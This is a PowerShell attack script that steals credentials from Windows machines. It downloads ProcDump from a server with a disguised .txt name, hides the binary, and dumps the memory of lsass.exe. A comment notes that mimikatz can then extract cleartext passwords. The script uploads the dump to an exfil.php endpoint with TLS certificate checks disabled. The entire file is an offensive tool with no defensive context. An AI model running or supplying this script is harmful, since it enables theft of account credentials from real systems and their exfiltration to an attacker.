[string] $server = "http://127.0.0.1"
[string] $process="lsass.exe" 
[string] $dumpfile = hostname

Function Exfiltrate{ # exfiltrate data from victim 
		[CmdletBinding()] param( 
		[string] $Path
		) 
		[System.Net.ServicePointManager]::ServerCertificateValidationCallback={true};
		$http = new-object System.Net.WebClient;
		[string] $url="$server/exfil.php";
		$exfil = $http.UploadFile($url,$Path);
		}
				
	Function ProccessDumpCommand { # Download and execute Procdump. Dump hash from privileged process. You have to use offline mimikatz to extract password in clear text
		[CmdletBinding()] param( 
		[string]$id
		)
		if($env:PROCESSOR_ARCHITECTURE -eq "x86"){
			$downloadURL = "$server/proc32.txt"
			[string] $FileOnDisk =  "$env:userprofile\AppData\proc32.txt"
			if ($downloadURL.Substring(0,5) -ceq "https") { 
			[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
			}
			(New-Object System.Net.WebClient).DownloadFile($downloadURL,$FileOnDisk)
			rename-item $FileOnDisk -NewName proc.exe
			Write-Host "ProcdessDump 32..." -ForegroundColor DarkGreen;
			attrib +h "$env:userprofile\AppData\proc.exe"
			}
		Else{ 
			$downloadURL = "$server/proc64.txt"
			[string] $FileOnDisk =  "$env:userprofile\AppData\proc64.txt"
			if ($downloadURL.Substring(0,5) -ceq "https") {
				[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
				}
			(New-Object System.Net.WebClient).DownloadFile($downloadURL,$FileOnDisk)
			rename-item $FileOnDisk -NewName proc.exe
			Write-Host "ProcessDump 64..." -ForegroundColor DarkGreen
			attrib +h "$env:userprofile\AppData\proc.exe"
			}
		$env:userprofile\AppData\proc.exe -accepteula -ma $process $env:userprofile\AppData\$dumpfile.dmp
		Start-Sleep -Seconds 60
		exfiltrate $env:userprofile\AppData\$dumpfile.dmp
		}
		
ProccessDumpCommand